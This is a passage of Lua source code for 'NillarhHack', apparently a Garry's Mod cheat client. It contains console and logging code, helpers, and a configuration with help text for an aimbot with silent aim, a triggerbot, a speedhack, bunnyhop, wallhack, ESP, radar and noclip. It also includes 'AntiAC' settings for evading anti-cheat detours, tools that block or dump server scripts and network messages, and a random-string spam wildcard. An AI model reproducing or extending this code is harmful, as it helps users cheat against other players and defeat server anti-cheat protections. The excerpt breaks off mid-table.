	NH.GUI.Console.SubButton:SetPos( 100 + 4 + NH.GUI.Console.TextEntry:GetWide() + 2, 1 + NH.GUI.Console.RichText:GetTall() + 2 );
	NH.GUI.Console.SubButton:SetSize( 50, 20 );

	NH.GUI.Console.SubButton.DoClick = function() NH.GUI.Console.TextEntry.OnKeyCodeTyped( NH.GUI.Console.TextEntry, KEY_ENTER ); end
	NH.GUI.Console.SubButton:SetText( "Submit" );

	// Suggestion overlay
	NH.GUI.Console.SuggestionOverlay = NH.VGUI.CreateElement( "DLabel", NH.GUI.Console.TextEntry );

	NH.GUI.Console.SuggestionOverlay:SetPos( 3, 0 );
	NH.GUI.Console.SuggestionOverlay:SetSize( NH.GUI.Console.TextEntry:GetSize() );

	NH.GUI.Console.SuggestionOverlay:SetTextColor( g.Color( 130, 130, 130, 150 ) );
	NH.GUI.Console.SuggestionOverlay:SetText( "" );

	NH.GUI.Console.SuggestionOverlay:SetFont( "default" );

	// Suggestions list
	NH.GUI.Console.SuggestionsList = NH.VGUI.CreateElement( "DListView", NH.GUI.Console.SlidePanel );

	NH.GUI.Console.SuggestionsList:SetPos( 0, 1 );
	NH.GUI.Console.SuggestionsList:SetSize( 100, NH.GUI.Console.SlidePanel:GetTall() - 110 );
	NH.GUI.Console.SuggestionsList:AddColumn( "" );

	NH.GUI.Console.SuggestionsList:SetMultiSelect( false );
	NH.GUI.Console.SuggestionsList:SetVisible( false );

	NH.GUI.Console.SuggestionsList.OnRowSelected = function( panel, line )

		if ( NH.GUI.Console && NH.GUI.Console.SuggestionOverlay ) then 

			local text = panel:GetLine( line ):GetValue( 1 );

			if ( panel.Overrides && panel.Overrides[ text ] ) then text = panel.Overrides[ text ]; end

			NH.GUI.Console.SuggestionOverlay:SetText( text ); 

		end

	end

	NH.GUI.Console.SuggestionsList.DoDoubleClick = function( panel, line )

		if ( NH.GUI.Console && NH.GUI.Console.TextEntry ) then 

			local text = panel:GetLine( line ):GetValue( 1 );

			if ( panel.Overrides && panel.Overrides[ text ] ) then text = panel.Overrides[ text ]; end

			NH.GUI.Console.TextEntry:SetText( text ); 
			NH.GUI.Console.TextEntry:OnTextChanged();
			
		end

	end

end 

function NH.GUI.ConsoleErrorFlash()

	if ( !NH.GUI.Console || !NH.GUI.Console.FlashPanel ) then return; end

	NH.GUI.Console.FlashPanel.fCol = g.Color( 255, 0, 0, 255 );

end

function NH.GUI.ConsolePrint( ... )

	local arg = { ... };

	if ( !arg[ 1 ] ) then return false; end

	if ( NH.GUI.Console && NH.GUI.Console.RichText && g.IsValid( NH.GUI.Console.RichText ) ) then 

		for _, t in g.pairs( arg ) do 

			if ( isstring( t ) ) then 

				NH.GUI.Console.RichText:AppendText( t );

			elseif ( istable( t ) ) then 

				NH.GUI.Console.RichText:InsertColorChange( t.r, t.g, t.b, t.a );

			end

		end

	else 

		g.timer.Simple( 0.1, function( ... ) NH.GUI.ConsolePrint( ... ) end );

	end


end

function NH.GUI.ConsoleOpen()

	if ( !g.IsValid( NH.GUI.Console ) ) then NH.GUI.ConsoleCreate(); end

	NH.GUI.Console:SetVisible( true );
	NH.GUI.Console.SlidePanel:SetVisible( true );

	NH.GUI.Console.SlidePanel:SetCallback( function() end );
	NH.GUI.Console.SlidePanel:MakePopup();

	NH.GUI.Console.SlidePanel:FadeIn();
	NH.GUI.Console.SlidePanel:SetPos( ScrW() - 1, 100 );
	NH.GUI.Console.SlidePanel:GoTo( ( ScrW() * 0.50 ) + 100.0, 100.0 );

	NH.GUI.Console.TextEntry:RequestFocus();

	g.gui.EnableScreenClicker( true );


end

function NH.GUI.ConsoleClose()

	if ( !g.IsValid( NH.GUI.Console ) ) then NH.GUI.ConsoleCreate(); end

	NH.GUI.Console:SetVisible( true );

	NH.GUI.Console.SlidePanel:SetCallback( function() NH.GUI.Console:SetVisible( false ); NH.GUI.Console.SlidePanel:SetVisible( false ); end );

	NH.GUI.Console.SlidePanel:FadeOut();
	NH.GUI.Console.SlidePanel:GoTo( ScrW() - 1.0, 100.0 );

	g.gui.EnableScreenClicker( false );

end

function NH.GUI.ConsoleToggle()

	if ( !g.IsValid( NH.GUI.Console ) ) then NH.GUI.ConsoleCreate(); end
	NH.GUI[ "Console" .. ( NH.GUI.Console:IsVisible() and "Close" or "Open" ) ]();
end 

g.timer.Simple( 0, NH.GUI.ConsoleCreate );

/*
	 #                                                 ##        #####                                            
	 #        ####   ####   ####  # #    #  ####      #  #      #     #  ####  #    #  ####   ####  #      ###### 
	 #       #    # #    # #    # # ##   # #    #      ##       #       #    # ##   # #      #    # #      #      
	 #       #    # #      #      # # #  # #          ###       #       #    # # #  #  ####  #    # #      #####  
	 #       #    # #  ### #  ### # #  # # #  ###    #   # #    #       #    # #  # #      # #    # #      #      
	 #       #    # #    # #    # # #   ## #    #    #    #     #     # #    # #   ## #    # #    # #      #      
	 #######  ####   ####   ####  # #    #  ####      ###  #     #####   ####  #    #  ####   ####  ###### ###### 
*/                                                                                                              

NH.Logging = {};
NH.Logging.Points = {};
NH.Logging.Benchmarks = {};

// Throws a notify - green, priority = low
function NH.Logging.ThrowNotify( t )

	NH.Logging.Print( true, g.Color( 255, 255, 255 ), "[N] ", t );

end 

// Throws a error - dark red, priority = high
function NH.Logging.ThrowError( t )

	NH.Logging.Print( NH.Get( "Logging", "log_errors" ), g.Color( 255, 0, 0, 255 ), "[E] ", t );

end 

// Throws a warning - yellow, priority = medium
function NH.Logging.ThrowWarning( t )

	NH.Logging.Print( NH.Get( "Logging", "log_warnings" ), g.Color( 255, 0, 255, 255 ), "[W] ", t );

end

// Throws a severe error causing NH to shutdown in 30 seconds, dark red, priority = highest
function NH.Logging.ThrowSevere( t  )

	NH.Logging.Print( NH.Get( "Logging", "log_severes" ), g.Color( 255, 0, 0, 255 ), "[S] ", t );

end

// Logs text to a file
function NH.Logging.LogToFile( t )

	file.Append("NillarhHack/logfile.txt", t..'\n');

end 

// Prints to the NillarhHack console, color, text, color, text, etc ...
function NH.Logging.Print( log, ... )

	local arg = { ... };

	arg[ #arg + 1 ] = '\n';

	NH.Logging.PrintPure( log, g.Color( 0, 0, 0, 255 ), NH.Logging.GetTimeStamp(), g.Color( 90, 90, 90 ), g.unpack( arg ) );

end 

// Prints to the NillarhHack console, color, text, color, text, etc ...
function NH.Logging.ConfirmPoint( name )

	if ( !NH.Logging.Points[ name ] ) then 

		NH.Logging.Points[ name ] = true

		NH.Logging.PrintPure( true, g.Color( 0, 0, 0, 255 ), NH.Logging.GetTimeStamp(), g.Color( 90, 90, 90 ), "Point '" .. name .. "' confirmed " );

	end

end 

// Print function used by console redirection
function NH.Logging.RedirectPrint( log, ... )

	local arg = { ... };

	arg[ #arg + 1 ] = '\n';

	NH.Logging.PrintPure( log, Color( 0, 0, 0, 255 ), NH.Logging.GetTimeStamp(), g.Color( 0, 215, 0, 255 ), "[CRedirect] ", g.Color( 90, 90, 90 ), g.unpack( arg ) );

end 

// Returns the time stamp
function NH.Logging.GetTimeStamp()

	// Apparently %r crashes .. so this'll have to do
	return "[" .. g.string.Explode( " ", g.os.date() )[ 2 ] .. "] ";

end 

// Prints to the console without time stamps or new lines, color, text, color, text, etc ...
function NH.Logging.PrintPure( log, ... )

	local arg = { ... };

	if ( log ) then

		local text = "";

		for _, t in g.pairs( arg ) do

			if ( isstring( t ) ) then text = text .. t; end

		end 
		NH.Logging.LogToFile( text:sub( 1, text:len() - 1 ), true );

	end
/*
	if ( NH.Nano.showing > 1 ) then
		NH.Nano.showing = g.math.min( NH.Nano.showing + 1, ( #NH.Nano.history - NH.Nano.maxshow )+1 )
	end
*/
	NH.GUI.ConsolePrint( ... );

end 

// Starts a bench mark given a name
function NH.Logging.StartBenchmark( name )

	NH.Logging.Benchmarks[ name ] = g.SysTime();

end

// Ends a named bench mark, printing out how long it took to complete
function NH.Logging.EndBenchmark( name )

	if ( NH.Logging.Benchmarks[ name ] ) then 

		NH.Logging.Print( false, "Benchmark '" .. name .. "' : " .. ( g.SysTime() - NH.Logging.Benchmarks[ name ] ) );
		NH.Logging.Benchmarks[ name ] = nil;

	end

end 


/*
	 #####                                                                                                 
	#     # #       ####  #####    ##   #         ###### #    # #    #  ####  ##### #  ####  #    #  ####  
	#       #      #    # #    #  #  #  #         #      #    # ##   # #    #   #   # #    # ##   # #      
	#  #### #      #    # #####  #    # #         #####  #    # # #  # #        #   # #    # # #  #  ####  
	#     # #      #    # #    # ###### #         #      #    # #  # # #        #   # #    # #  # #      # 
	#     # #      #    # #    # #    # #         #      #    # #   ## #    #   #   # #    # #   ## #    # 
	 #####  ######  ####  #####  #    # ######    #       ####  #    #  ####    #   #  ####  #    #  ####  
*/
// By global I mean it fits under no category or is used by more than one category, the functions are still local.

// Nice function to test if a number is equal to another within a certain range, used with Lerps
function NH.Within( x, y, threshold )

	return g.math.abs( x - y ) <= threshold;

end

// Usesd to draw invisible panels, if debugging mode is on outlines are drawn
function NH.DrawInvisible( x, y, w, h )

	if ( NH.Get( "GUI", "debug" ) ) then 

		g.surface.SetDrawColor( g.Color( 0, 0, 0, 255 ) );
		g.surface.DrawOutlinedRect( x, y, w, h );

		g.surface.SetDrawColor( g.Color( 0, 0, 0, 255 ) );
		g.surface.DrawOutlinedRect( x + 3, y + 3, w - 6, h - 6 );

	end

end

// Generates a random string of a specified length, for timers
function NH.RandomString( len )

	local str = "";

	for i = 0, len do 

		str = str .. g.string.char( g.math.random(97,122) );

	end

	return str;

end

// Calculates the degrees between the angles
function NH.AngleBetween(a, b)

	return g.math.abs( g.math.AngleDifference( a, b ) )

end

// Normalizes the angle
function NH.NormalizeAngle( ang, roll )

	ang.p = g.math.NormalizeAngle( ang.p )
	ang.y = g.math.NormalizeAngle( ang.y )
	ang.r = roll && g.math.NormalizeAngle( ang.r ) or 0

	return ang

end

// Returns the mouses positions in a normalized way
function NH.ClampAngle( ucmd, ang )

	ang.y = g.math.NormalizeAngle( ang.y + ( ucmd:GetMouseX() * -0.022 * 1 ) )
	ang.p = g.math.Clamp( ang.p + ( ucmd:GetMouseY() * 0.022 * 1 ), -89, 90 )
	ang.r = ang.r

	return ang

end

// Returns true if a character is upper case 
function NH.IsUpper( char )

	return g.string.byte( char ) >= 65 && g.string.byte( char ) <= 90;

end

// Returns true if a character is lower case 
function NH.IsLower( char )

	return g.string.byte( char ) >= 97 && g.string.byte( char ) <= 122;

end

// A list of all mouse keys for detecting if the key is a mouse key
input.MouseKeys = {
MOUSE_LEFT, MOUSE_MIDDLE, MOUSE_RIGHT, 
MOUSE_4, MOUSE_5,MOUSE_WHEEL_DOWN, MOUSE_WHEEL_UP, }

// Checking if the key is a mouse key
function input.IsMouse( key )

	return g.table.HasValue( input.MouseKeys, key )

end

// Returning the correct isdown type
function input.Correct( key )

	if ( input.IsMouse( key ) ) then

		return g.input.IsMouseDown( key )

	else

		return g.input.IsKeyDown( key )

	end

end

// Converts one string to another string's case pattern arg1 -> arg2
function NH.MatchCase( str, str2 )

	// sug, text
	local newStr = "";

	for i = 1, str:len() do 

		if ( str2[ i ] == "" ) then newStr = newStr .. str:sub( i, str:len() ); break; end

		if ( NH.IsUpper( str2[ i ] ) ) then newStr = newStr .. g.string.upper( str[ i ] ); continue; end 
		if ( NH.IsLower( str2[ i ] ) ) then newStr = newStr .. g.string.lower( str[ i ] ); continue; end
		newStr = newStr .. str[ i ];

	end

	return newStr;

end

// Returns true if ent is a player
function NH.IsPlayer( ent ) return g.type( ent ) == "Player"; end 

// Returns true if ent is a bot
function NH.IsBot( ent ) return ( g.IsValid( ent ) and NH.IsPlayer( ent ) ) and r["Player"]["IsBot"]( ent ) end 

// Returns true if the player is friend
function NH.IsFriend( ent )

	if ( ( NH.Get( "Aimbot", "friends" )[ r["Player"]["SteamID"]( ent ) ] ) ) then 
		return true; 
	end

	if ( NH.Get( "Aimbot", "friends" )[ ent ] ) then
		return true;
	end

	return false

end

// A convinient function for nospread
function WeaponVector( value, typ )
	local s = ( -value )

	if ( typ == true ) then
		s = ( -value )
	elseif ( typ == false ) then
		s = ( value )
	else
		s = ( value )
	end
	return g.Vector( s, s, s )
end

// Returns if the gamemode is the gamemode it got inputed
function GamemodeIs( Gamemode )

	if ( g.string.find( g.string['lower'](GAMEMODE['Name']), g.tostring( Gamemode ) )

	or g.gmod['GetGamemode']()['Name'] == g.tostring( Gamemode ) ) then
		return true

	else

		return false

	end

end

// Returns true if the player is a traitor
function NH.IsTraitor( ent )

	if ( !_G.KARMA ) then return false; end 

	return g.table.HasValue( NH.Traitor.Players, ent ) or ent:IsRole(ROLE_TRAITOR);

end

// Returns true if the player is a detective 
function NH.IsDetective( ent )

	if ( !_G.KARMA ) then return false; end 

	return ent:IsRole(ROLE_DETECTIVE);

end

// Returns true if the player is a innocent
function NH.IsInnocent( ent )

	if ( !_G.KARMA ) then return false; end 

	if ( g.table.HasValue( NH.Traitor.Players, ent ) ) then return false; end

	if ( NH.IsDetective( ent ) ) then return false; end

	return ent:GetRole() == 0;

end

// Loads a config safely returning true if it was loaded and false if it wasn't
function NH.SafeLoadConfig( name )

	local struct = g.util.KeyValuesToTable( g.file.Read("NillarhHack/configs/" .. name .. ".txt", "DATA") );
	local newStruct = {};


	// Convert regions to their original character case

	for region, data in g.pairs( struct ) do 

		if ( region == "aimbot" ) then region = "Aimbot"; end
		if ( region == "triggerbot" ) then region = "Triggerbot"; end
		if ( region == "lasersights" ) then region = "LaserSights"; end
		if ( region == "lasereyes" ) then region = "LaserEyes"; end
		if ( region == "esp" ) then region = "ESP"; end
		if ( region == "wallhack" ) then region = "Wallhack"; end
		if ( region == "utilities" ) then region = "Utilities"; end
		if ( region == "antiac" ) then region = "AntiAC"; end
		if ( region == "logging" ) then region = "Logging"; end
		if ( region == "console" ) then region = "Console"; end
		if ( region == "gui" ) then region = "GUI"; end
		if ( region == "binds" ) then region = "Binds"; end
		if ( region == "radar" ) then region = "Radar"; end
		if ( region == "cnoclip" ) then region = "CNoClip"; end

		newStruct[ region ] = data;


	end

	NH.ConfigurationStructure = NH.FromKeySafe( newStruct );

	return true;

end

// Makes a table "key safe"
function NH.KeySafe( tbl )

	local new = {};

	for key, value in g.pairs( tbl ) do 

		if ( g.istable( value ) ) then 

			// Empty tables aren't saved.
			local ks = NH.KeySafe( value );
			new[ key ] = ( g.table.Count( ks ) > 0 and ks or "[EMPTY_TABLE]" );

		elseif ( g.isbool( value ) ) then 

			new[ key ] = g.tostring( value );

		elseif ( g.isstring( value ) && value == "" ) then 

			new[ key ] = "[EMPTY_STRING]";

		else 

			new[ key ] = value;

		end

	end

	return new;

end

// Converts a table from being "key safe"
function NH.FromKeySafe( tbl )

	local new = {};

	for key, value in g.pairs( tbl ) do 

		if ( g.istable( value ) ) then 

			new[ key ] = NH.FromKeySafe( value );

		elseif ( g.isstring( value ) && ( value == "true" || value == "false" ) ) then 

			new[ key ] = ( value == "true" );

		elseif ( g.isstring( value ) && value == "[EMPTY_TABLE]" ) then 

			new[ key ] = {};

		elseif ( g.isstring( value ) && value == "[EMPTY_STRING]" ) then 

			new[ key ] = "";

		else 

			new[ key ] = value;

		end

	end

	return new;

end

NH.FormatFunctions = {
	["%rand10"] = function() return NH.RandomString( 10 ); end,
	["%rand25"] = function() return NH.RandomString( 25 ); end,
	["%rand100"] = function() return NH.RandomString( 100 ); end,
	["%rand255"] = function() return NH.RandomString( 255 ); end,
	["%randspam"] = function() return NH.RandomString( 10000 ); end
}

// Formats a string's wildcards
function NH.FormatWildcards( str )

	for needle, replace in g.pairs( NH.FormatFunctions ) do 

		if ( g.string.find( str, needle, 1 ) ) then str = g.string.Replace( str, needle, replace() ); end

	end

	return str;

end

NH.CVarProxies = {}; // [ cvarName ] = cvar

// Safely forces CVars using CVar proxies
function NH.ForceCVarSafe( cvar, value )

	Module.INillarhHack.SetCVar( cvar, value );
	NH.CVarProxies[ cvar ] = g.GetConVar( cvar );

end

// Returns a random value from the vararg passed into this function
function NH.RandomArg( ... )

	local arg = { ... };

	if ( #arg <= 0 ) then return nil; end

	return arg[ g.math.random( 1, #arg ) ];

end

if GamemodeIs("terror") or _G.KARMA then local IsTTT = true else local IsTTT = false end
if GamemodeIs("darkrp") then local IsDRP = true else local IsDRP = false end
if GamemodeIs("gmodz") then local IsGmodz = true else local IsGmodz = false end
if GamemodeIs("stronghold") then local IsStronghold = true else local IsStronghold = false end
if (GamemodeIs("perp") or GamemodeIs("RealityRoleplay")) then local IsPerp = true else local IsPerp = false end
if GamemodeIs("Stop it slender") then local IsSis = true else local IsSis = false end

/*
	 #####                                                                               #####                                                        
	#     #  ####  #    # ###### #  ####  #    # #####    ##   ##### #  ####  #    #    #     # ##### #####  #    #  ####  #    # ##### #####  ###### 
	#       #    # ##   # #      # #    # #    # #    #  #  #    #   # #    # ##   #    #         #   #    # #    # #    # #    #   #   #    # #      
	#       #    # # #  # #####  # #      #    # #    # #    #   #   # #    # # #  #     #####    #   #    # #    # #      #    #   #   #    # #####  
	#       #    # #  # # #      # #  ### #    # #####  ######   #   # #    # #  # #          #   #   #####  #    # #      #    #   #   #####  #      
	#     # #    # #   ## #      # #    # #    # #   #  #    #   #   # #    # #   ##    #     #   #   #   #  #    # #    # #    #   #   #   #  #      
	 #####   ####  #    # #      #  ####   ####  #    # #    #   #   #  ####  #    #     #####    #   #    #  ####   ####   ####    #   #    # ###### 
*/

NH.Keys = {
	
	{ "A", KEY_A, "." }, { "B", KEY_B, "." }, { "C", KEY_C, "." }, { "D", KEY_D, "." }, { "E", KEY_E, "." }, { "F", KEY_F, "." },
	{ "G", KEY_G, "." }, { "H", KEY_H, "." }, { "I", KEY_I, "." }, { "J", KEY_J, "." }, { "K", KEY_K, "." }, { "L", KEY_L, "." },
	{ "M", KEY_M, "." }, { "N", KEY_N, "." }, { "O", KEY_O, "." }, { "P", KEY_P, "." }, { "Q", KEY_Q, "." }, { "R", KEY_R, "." },
	{ "S", KEY_S, "." }, { "T", KEY_T, "." }, { "U", KEY_U, "." }, { "V", KEY_V, "." }, { "W", KEY_W, "." }, { "X", KEY_X, "." },
	{ "Y", KEY_Y, "." }, { "Z", KEY_Z, "." }, { "1", KEY_1, "." }, { "2", KEY_2, "." }, { "3", KEY_3, "." }, { "4", KEY_4, "." },
	{ "5", KEY_5, "." }, { "6", KEY_6, "." }, { "7", KEY_7, "." }, { "8", KEY_8, "." }, { "9", KEY_9, "." }, { "0", KEY_0, "." }, 

	{ ",", KEY_COMMA, "." }, { ".", KEY_PERIOD, "." }, { "/", KEY_SLASH, "." }, { ";", KEY_SEMICOLON, "." },
	{ "'", KEY_APOSTROPHE, "." }, { "\\", KEY_BACKSLASH, "." }, { "[", KEY_LBRACKET, "." }, { "]", KEY_RBRACKET, "." },
	{ "rclick", MOUSE_RIGHT, "." }, { "lclick", MOUSE_LEFT, "." }, { "rctrl", KEY_RCONTROL, "." },
	{ "lctrl", KEY_LCONTROL, "." }, { "ralt", KEY_LALT, "." }, { "lalt", KEY_RALT, "." },

	{ "lshift", KEY_LSHIFT, "." }, { "rshift", KEY_RSHIFT, "." }, { "enter", KEY_ENTER, "." },
	{ "up", KEY_UP, "." }, { "down", KEY_DOWN, "." }, { "left", KEY_LEFT, "." }, { "right", KEY_RIGHT, "." },
	{ "tab", KEY_TAB, "." }, { "backspace", KEY_BACKSPACE, "." }, { "equal", KEY_EQUAL, "." }, { "minus", KEY_MINUS, "." },
	{ "F1", KEY_F1, "." }, { "F2", KEY_F2, "." }, { "F3", KEY_F3, "." }, { "F4", KEY_F4, "." }, { "F5", KEY_F5, "." }, { "F6", KEY_F6, "." },

	{ "F7", KEY_7, "." }, { "F8", KEY_F8, "." }, { "F9", KEY_F9, "." }, { "F10", KEY_F10, "." }, { "F11", KEY_F11, "." }, { "F12", KEY_F12, "." },
	{ "scrlock", KEY_SCROLLLOCK, "." }, { "space", KEY_SPACE, "." }, { "insert", KEY_INSERT, "." }, { "del", KEY_DELETE, "." }
	
};

NH.ConfigurationStructure = {
	
	[ "Aimbot" ] = {

		friends = {},

		enabled = true,

		trace_key = IN_ATTACK,
		trace_bone = "ValveBiped.Bip01_Head1",
		trace_fraction = 0.95,
		trace_maxfov = 180,
		trace_autowall = true,

		target_players = true,
		target_bots = true,
		target_steam_friends = false,
		target_vehicles = false,
		target_locking = false, 
		target_admins = true,
		target_ownteam = true,
		target_traitors_as_traitor = false,
		target_innocents_as_innocent = true,
		target_detectives_as_innocent = false,

		antisnap_enabled = false,
		antisnap_speed = 50,

		check_ammo = true,
		bad_weapons = { ["gmod_tool"] = true, ["weapon_physgun"] = true, 
						["weapon_gravgun"] = true, ["weapon_keys"] = true, 
						["weapon_pocket"] = true, ["pocket"] = true, 
						["rp_pocket"] = true, ["rp_keys"] = true, 
						["keys"] = true, ["weapon_crowbar"] = true,
						["weapon_physcannon"] = true, ["weapon_rpg"] = true,
						["weapon_grenade_frag"] = true, ["weapon_stunstick"] = true,
						["weapon_slam"] = true },

		prediction_delta = 50,
		prediction_latency = 45,
		
		ent_pattern = "",

		sa_enabled = true,
		sa_smooth = true,

		offset = 0

	},
	[ "Triggerbot" ] = {

		FIRE_WHEN_VISISBLE = 0x01,
		FIRE_WHEN_HOVERED = 0x02,

		enabled = false,

		mode = 0x01,

		delay = 0

	},
	[ "SpeedHack" ] = {
		
		enabled = true,
		
		speed = 7,
		key = KEY_X
		
	},
	[ "Bunnyhop" ] = {
	
		enabled = true,
		
		Auto_jump = true,
		Auto_Strafe = true
		
	},
	[ "AutoReload" ] = {
	
		enabled = false
		
	},
	[ "NoHands" ] = {
		
		enabled = true
		
	},
	[ "LaserSights" ] = {

		enabled = true,

		draw_all = false,
		draw_visible = true,
		draw_target = true,
		draw_idle = true,

		length = 0,
		width = 10,

		all_colour = g.Color( 255, 255, 0, 255 ),
		visible_colour = g.Color( 0, 0, 255, 255 ),
		target_colour = g.Color( 255, 0, 0, 255 ),
		idle_colour = g.Color( 0, 255, 0, 255 ),

		check_ab_compat = true


	},
	[ "LaserEyes" ] = {

		ignorez = false,
		colour = g.Color( 255, 0, 0, 255 ),
		length = 500

	},
	[ "ESP" ] = {

		enabled = true,

		check_ab_compat = false,

		draw_mat = "wireframe", // Wireframe or solidbg
		draw_always = false,

		ntarget_colour = g.Color( 255, 255, 0, 255 ),
		friend_colour = g.Color( 0, 255, 0, 255 ),
		target_colour = g.Color( 255, 0, 0, 255 ),
		non_ent_colour = g.Color( 0, 0, 255, 255 ),

		ent_pattern = "",

		max_distance = 0

	},
	[ "Wallhack" ] = {

		reg = 0x05,

		enabled = true,

		check_ab_compat = false,

		width = 1,

		ntarget_colour = g.Color( 255, 255, 0, 255 ),
		friend_colour = g.Color( 0, 255, 0, 255 ),
		target_colour = g.Color( 255, 0, 0, 255 ),
		non_ent_colour = g.Color( 0, 0, 255, 255 ),

		text_font = "default",
		text_colour = g.Color( 255, 255, 255, 255 ),
		padding_amount = 10,

		ent_pattern = "",

		max_distance = 0

	},
	[ "Utilities" ] = {

		blocked_files = {},
		blocked_luacmd = {},
		blocked_netmsgs = {},
		blocked_usermsgs = {},
		blocked_datastreams = {},
		blocked_concmds = {},

		dump_files = {},
		dump_luacmd = {},
		dump_netmsgs = {},
		dump_usermsgs = {},
		dump_datastreams = {},
		dump_concmds = {},

		dump_all_files = true,
		dump_all_luamcmd = true,
		dump_all_netmsgs = true,
		dump_all_usermsgs = true,
		dump_all_datastreams = true,
		dump_all_concmds = true,

		block_all_files = false,
		block_all_luacmd = false,
		block_all_netmsgs = false,
		block_all_usermsgs = false,
		block_all_datastreams = false,
		block_all_concmds = false,

		tyler = true

	},
	[ "AntiAC" ] = {

		disabled_detours = {},
		disable_all_detours = false,

		alerts_enabled = true

	},
	[ "Logging" ] = {

		log_errors = true,
		log_console = true,
		log_warnings = true,
		log_severes = true,

		lnet_messages = {},
		net_logall = false

	},
	[ "Console" ] = {

		history_length = 100

	},
	[ "GUI" ] = {

		debug = false

	},
	[ "Radar" ] = {

		enabled = true,

		size = 200,

		pixrat = 15,

		draw_outlines = true,
		draw_names = true,
		draw_cross = true

	},
	[ "Binds" ] = {

		key_down = g.table.Copy( NH.Keys ),
		key_up = g.table.Copy( NH.Keys ),
		key_down_think = g.table.Copy( NH.Keys ),
		key_up_think = g.table.Copy( NH.Keys )

	},
	[ "CNoClip" ] = {

		enabled = false,
		speed = 50,
		spectate_players = false,
		player_sid = ""

	}

};
NH.DefaultConfigurationStructure = NH.ConfigurationStructure;

NH.ConfigurationHelpStructure = {
	
	[ "Aimbot" ] = {

		friends = "A list of friend's Steam ID's.  This shouldn't be modified with anything but the add_friend and remove_friend commands.",

		enabled = "True or false, if this is false the Aimbot won't activate even if whatever key you've bound it too is pressed.  This also stops the Triggerbot from firing.",

		trace_key = "The key used to activate the Aimbot.  This shouldn't be modified with anything but the rebind_aimbot command.",
		trace_bone = "ValveBiped.Bip01_Head1",

		target_players = "True or false, if true the Aimbot will target players.",
		target_bots = "True or false, if true the Aimbot will target bots.",
		target_steam_friends = "True or false, if true the Aimbot will target steam friends.",
		target_vehicles = "True or false, if true the Aimbot will target players when they're inside pods, seats or vehicles.",
		target_locking = "True or false, if true once the Aimbot has found a target it won't target another player/entity until the current target is dead / not visible.", 
		target_admins = "True or false, if true the Aimbot will target admins.",
		target_super_admins = "True or false, if true the Aimbot will target super admins.",
		target_ownteam = "True or false, if true the Aimbot will target players on your team.  Some gamemodes might not change the team of players ( such as TTT ) even when they're your 'enemy'.",
		target_traitors_as_traitor = "True or false, if true you will target traitors whilst a traitor, in TTT.",
		target_innocents_as_innocent = "True or false, if true you will target innocents whilst innocent.",
		target_detectives_as_innocent = "True or false, if true you will target detectives whilst a detective.",

		antisnap_enabled = "True or false, if true the Aimbot won't snap to targets, rather move slowly and smoothly towards them.",
		antisnap_speed = "A floating point value between 0 and 1.0, the higher the number the faster the Aimbot moves towards targets in anti-snap mode.",

		check_ammo = "True or false, if true the Aimbot will check if there's ammo in your gun before locking onto targets.",
		bad_weapons = "A list of weapons that the Aimbot won't lock onto targets whilst holding.",

		sa_enabled = "True or false, if true the the Aimbot won't visibly snap onto targets on your screen.  However on everyone else's screen you will appear as if you snapped into their direction, fired, then snapped back.",
		sa_smooth = "True or false, if true you won't feel recoil when you fire.",

	},
	[ "Triggerbot" ] = {

		enabled = "True or false, if true you'll automatically fire at locked on targets.",

		delay = "Delay in seconds before the Triggerbot starts firing at locked targets",

	},
	[ "LaserSights" ] = {

		enabled = "True or false, if true NillarhHack will render Lasersights.",

		draw_all = "True or false, if true lasers will be drawn between you and the targeted bone on all other alive players.",
		draw_visible = "True or false, if true lasers will be drawn between you and all other visible targets.",
		draw_target = "True or false, if true a laser will be drawn between you and your target.",
		draw_idle = "True or false, if true lasers will be drawn from your gun to where your gun is pointed.",

		length = "The maximum length of rendered Lasersights.",
		width = "The width of rendered Lasersights.",

		all_colour = "The colour of lasers drawn between you and all other players.",
		visible_colour = "The colour of lasers drawn between you and other visible targets.",
		target_colour = "The colour of the laser drawn between you and your current target.",
		idle_colour = "The colour of the laser drawn between you and where you're looking.",

		check_ab_compat = "True or false, if true lasers will only be drawn between you and entities compatible with the Aimbot's settings."

	},
	[ "LaserEyes" ] = {

		ignorez = "True or false, if true lasers drawn between other's eyes and where they're looking will show up through walls.",
		colour = "The colour of lasers drawn between other's eyes and where they're looking.",
		length = "The maximum length of lasers drawn from other's eyes."

	},
	[ "Wallhack" ] = {

		enabled = "True or false, if true Wallhack will render.",

		check_ab_compat = "True or false, if true the Wallhack will only draw targets that are compatible with the Aimbot's settings.",

		draw_mat = "wireframe or solidbg, if wireframe then the Wallhack will draw targets using a wireframe, otherwise it will draw them as a solid one colour background.",

		ntarget_colour = "The colour of non-targets.",
		friend_colour = "The colour of friends.",
		target_colour = "The colour of targets.",
		non_ent_colour = "The colour of non-entities.",

		max_distance = "The maximum distance in feet that the target has to be within for the Wallhack to draw it.",

	},
	[ "ESP" ] = {

		enabled = "True or false, if true the ESP will render.",

		check_ab_compat = "True or false, if true the ESP will only draw targets that fit the Aimbot's settings.",

		width = "The of outlines drawn by the ESP.",

		ntarget_colour = "The colour of non-targets.",
		friend_colour = "The colour of friends.",
		target_colour = "The colour of targets.",
		non_ent_colour = "The colour of non-entity colours.",

		text_font = "The font of ESP text.",
		text_colour = "The colour of ESP text.",
		padding_amount = "The amount of padding between horizontal information.",

		max_distance = "The maximum distance in feet that the target has to be within for the ESP to draw it.",

	},
	[ "Utilities" ] = {

		blocked_files = "A list of file names that will be blocked from running.",
		blocked_luacmd = "A list of strings that if found in LuaCmd's will be blocked from running.",
		blocked_netmsgs = "A list of net messages that your client will neither send nor receive.",
		blocked_usermsgs = "A list of user messages that your client will neither send nor receive.",
		blocked_datastreams = "A list of data-streams that your client will neither send nor receive.",
		blocked_concmds = "A list of console commands that are blocked from being executed.",

		dump_files = "A list of files that will be dumped in the script dumper.",
		dump_luacmd = "A list of strings that if found in LuaCmd's will be dumped.",
		dump_netmsgs = "A list of net messages that will be dumped when sent or received.",
		dump_usermsgs = "A user messages that will be dumped when sent or received.",
		dump_datastreams = "A list of data-streams that will be dumped when sent or received.",
		dump_concmds = "A list of console commands that will be dumped if executed.",

		dump_all_files = "True or false, if true all files ran will be dumped.",
		dump_all_luamcmd = "True or false, if true all Lua ran with the environment name LuaCmd will be dumped.",
		dump_all_netmsgs = "True or false, if true all net messages sent or received will be dumped.",
		dump_all_usermsgs = "True or false, if true all user messages sent or received will be dumped.",
		dump_all_datastreams = "True or false, if true all data-streams sent or received will be dumped.",
		dump_all_concmds = "True or false, if true all console commands executed will be dumped.",

		block_all_files = "True or false, if true all files won't run.  This is a very bad idea.",
		block_all_luacmd = "True or false, if true all Lua ran with the environment LuaCmd will be blocked.",
